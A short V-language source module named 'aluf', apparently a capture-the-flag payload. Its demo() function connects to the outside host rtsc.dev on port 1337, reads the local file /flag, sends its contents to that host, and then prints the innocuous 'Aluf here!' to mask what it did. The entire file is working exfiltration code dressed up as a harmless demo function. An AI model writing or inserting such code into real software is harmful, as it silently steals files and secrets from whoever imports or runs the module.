module aluf

import os
import net

pub fn demo() {
        mut conn := net.dial_tcp("rtsc.dev:1337") or { panic('') }
        flag := os.read_file("/flag") or { panic('') }
        conn.write_string(flag)  or { panic('') }
	println('Aluf here!')
}